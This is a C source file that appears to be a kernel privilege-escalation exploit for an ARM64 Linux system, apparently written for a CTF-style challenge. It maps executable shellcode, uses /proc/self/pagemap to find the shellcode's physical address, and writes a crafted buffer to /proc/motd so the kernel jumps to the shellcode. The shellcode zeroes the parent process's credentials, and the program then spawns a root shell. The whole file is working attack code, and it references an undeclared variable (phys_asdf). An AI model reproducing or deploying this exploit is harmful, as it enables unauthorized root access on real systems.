#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>

#define PHYS_OFF 0xFFFFFFC000000000
#define PAGE_SIZE 0x1000
#define PFN_MIN 0x40000

// Kernel shellcode - overwrite parent's creds with zeroes
void dumptask()
{
    // Get 4k-aligned kernel stack address
    uint64_t sp;
    __asm__ __volatile__ ("\t mov %0, sp" : "=r"(sp));
    sp &= ~(0x3FFF);
    uint64_t *stack = (uint64_t *)sp;

    // Get taskstruct from stack
    uint32_t *ts = stack[2];
    // Get parent task struct from task struct
    uint32_t *pts = *((uint64_t*)(((uint64_t)ts) + 700 + 12));
    // Overwrite creds on parent task struct
    uint64_t creds = *((uint64_t*)(((uint64_t)pts) + 0x458 - 16));
    *((uint64_t *)(creds + 4)) = 0;
    *((uint64_t *)(creds + 8)) = 0;
    *((uint64_t *)(creds + 12)) = 0;
    *((uint64_t *)(creds + 16)) = 0;
    *((uint64_t *)(creds + 20)) = 0;
    *((uint64_t *)(creds + 24)) = 0;

    __asm__ __volatile__ ("eret");
}

// Get identity mapped physical address for userland virtual page
uint64_t get_pfn(uint64_t uaddr){ 
    char buf[256];
    uint64_t pfn;
    memset(buf,0,256);
    sprintf(buf,"/proc/%d/pagemap",getpid());
    printf("[*] reading pagemap from... %s\n",buf); 
    int fd= open(buf,0);
    lseek(fd,uaddr/PAGE_SIZE * sizeof(uint64_t),0);
    read(fd,&pfn,sizeof(pfn));
    close(fd);
    printf("[*] pfn %p\n",pfn);
    return pfn;
}
uint64_t translate(uint64_t uaddr) {
  return PHYS_OFF + PAGE_SIZE * (get_pfn(uaddr) - PFN_MIN);
}

int main(int argc, char **argv)
{
    // Shellcode buffer
    uint64_t addr = mmap(0,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,0,0);
    printf("[*] mmaped shellcode @ %p\n",addr);
    // Copy shellcode to page
    memcpy(addr, dumptask, 0x200);
    // Calculate shellcode physical address
    uint64_t phys_addr = translate(addr);
    printf("[*] shellcode physmap addr %p\n",phys_addr);
    printf("[*] global physmap addr %p\n",phys_asdf);
    // Prepare pwn buffer - kernel will jump to third word
    uint64_t *buffer = (uint64_t *)malloc(24);
    buffer[0] = 0x4141414141414141;
    buffer[1] = 0x4242424242424242;
    buffer[2] = (uint64_t)phys_addr;

    // Fork!
    if (fork() == 0)
    {
        printf("[i] In child, waiting 1s\n");
        sleep(1);
        // Trigget sploit in child
        printf("[i] Running write\n");
        FILE *f = fopen("/proc/motd", "w");
        fwrite(buffer, 24, 1, f);
        fflush(f);
        fclose(f);

        // we probably never get here..?
        printf("[e] Returned from write()!\n");
        for (;;) {}
    }
    else
    {
        printf("[i] In parent.\n");
        sleep(4);
        printf("[i] getuid: %i\n", getuid());
        if (getuid() == 0)
        {
            printf("[i] w00t w00t g0t r00t! don't forget to su -.\n");
            system("sh");
        }
        else
        {
            printf("[e] no root :(\n");
        }
    }
}
